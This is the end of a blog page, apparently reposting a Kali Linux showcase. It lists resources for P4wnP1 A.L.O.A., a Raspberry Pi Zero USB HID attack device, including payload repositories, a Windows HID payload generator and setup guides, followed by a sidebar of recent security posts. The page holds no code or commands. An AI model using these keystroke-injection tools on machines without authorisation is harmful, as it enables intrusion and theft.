<li><a href="https://www.kali.org/docs/arm/raspberry-pi-zero-w-p4wnp1-aloa/">Kali Linux P4wnP1 A.L.O.A. Documentation</a></li>
</ul>
<p><strong>Community Resources</strong>:</p>
<ul>
<li><a href="https://thingiverse.com/thing:2701424">A Case for P4wnP1 with a spot for an OLED screen</a></li>
<li><a href="https://github.com/FuocomanSap/P4wnp1-ALOA-Menu-Reworked">A Menu to use with an OLED screen on the P4wnP1 A.L.O.A</a></li>
<li><a href="https://github.com/beboxos/P4wnP1-ALOA-HID-payloads">Additional Payloads for P4wnP1 A.L.O.A.</a></li>
<li><a href="https://levelup.gitconnected.com/hacking-with-the-raspberry-pi-zero-w-8520a4d72b2e">Hacking with the Raspberry Pi Zero W</a></li>
<li><a href="https://jamesachambers.com/kali-linux-p4wnp1-aloa-guide-setup-usage-examples">Kali Linux P4wnP1 A.L.O.A. Guide ‚Äì Setup / Usage / Examples</a></li>
<li><a href="https://medium.com/azkrath/p4wnp1-a-l-o-a-an-advanced-hid-attack-device-d906ae5bf48c">P4wnP1 A.L.O.A.‚Äî An advanced HID attack device</a></li>
<li><a href="https://tenaka.net/p4wnp1-hid-attack">Pi Zero as a HID \ USB Device (P4wnP1 A.L.A.O)</a></li>
<li><a href="https://youtube.com/watch?v=s0K-YIL_G5c">Video about using an OLED screen with the P4wnP1 A.L.O.A</a></li>
<li><a href="https://github.com/federicodotta/LetMeHID">Windows HID payload generator</a></li>
</ul>
<h4 id="source"><a href="https://www.kali.org/blog/community-showcase-using-kali-pi-p4wnp1-aloa/">Source</a></h4>

			</div>
		</article>
	</main>
<aside>
	<div>
		<div>
			<h3>LATEST POSTS</h3>
		</div>
		<div>
			<ul>
				
				<li><a href="/posts/2025-03-21-evolving-together-the-next-chapter-in-o/">Evolving Together The Next Chapter in Our Partner Journey</a></li>
				
				<li><a href="/posts/2025-03-21-this-week-in-security-the-github-supply/">This Week in Security The Github Supply Chain Attack Ransomware Decryption and Paragon</a></li>
				
				<li><a href="/posts/2025-03-21-modernize-your-industrial-infrastructur/">Modernize Your Industrial Infrastructure for Cybersecurity and AI Readiness with Cisco Validated Designs</a></li>
				
				<li><a href="/posts/2025-03-21-cve-2025-2590---code-projects-human-res/">CVE-2025-2590 - Code-projects Human Resource Management System Cross-Site Scripting Vulnerability</a></li>
				
				<li><a href="/posts/2025-03-21-cve-2025-2589---code-projects-human-res/">CVE-2025-2589 - Code-projects Human Resource Management System Unauthorized Access Vulnerability</a></li>
				
			</ul>
		</div>
	</div>
</aside>


	<footer>
	<p>&copy; 2025 <a href="https://ghariib.ir/"><b>Alireza Gharib. All right reserved</b></a>.
	<a href="https://github.com/Gharib110"><b>Github</b></a>.
	</p>
</footer>

</body>
</html>
